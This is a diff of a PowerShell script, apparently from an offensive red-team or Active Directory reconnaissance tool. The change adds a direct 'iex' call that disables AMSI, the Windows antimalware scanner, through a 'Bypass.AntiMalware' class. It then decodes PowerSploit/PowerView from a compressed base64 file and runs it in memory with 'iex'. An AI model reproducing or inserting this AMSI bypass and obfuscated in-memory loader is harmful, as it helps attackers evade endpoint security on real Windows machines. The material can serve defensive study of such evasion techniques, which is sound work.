@@ -60,12 +60,9 @@ function Import-CustomModule($ScriptPath, $ModuleName){
 #
 # Before importing any module, it's better to disable AMSI
 #
+iex $PSScriptRoot\modules\amsi.ps1
 
-[System.Text.Encoding] $enc = [System.Text.Encoding]::UTF8
-$base64str = $enc.GetString((Get-DecompressedByteArray -byteArray (Get-Content $PSScriptRoot\modules\amsi.bin)))
-iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64str)))
-
-if([Bypass.A_M_S_I]::Disable() -eq "0") {
+if([Bypass.AntiMalware]::Disable() -eq "0") {
     Write-Output "[+] AMSI has been disabled"
 } else {
     Write-Output "[!] Problem while disabling AMSI"
@@ -74,6 +71,7 @@ if([Bypass.A_M_S_I]::Disable() -eq "0") {
 if (-Not ((Get-Module -Name "PowerSploit") -ne $null -or (Get-Module -Name "PowerView") -ne $null -or (Get-Module -Name "Recon") -ne $null)){
     Write-Output "[+] PowerSploit module not found. Importing from compressed bin file ..."
 
+    [System.Text.Encoding] $enc = [System.Text.Encoding]::UTF8
     $base64str = $enc.GetString((Get-DecompressedByteArray -byteArray (Get-Content $PSScriptRoot\modules\pview.bin)))
     iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64str)))
 
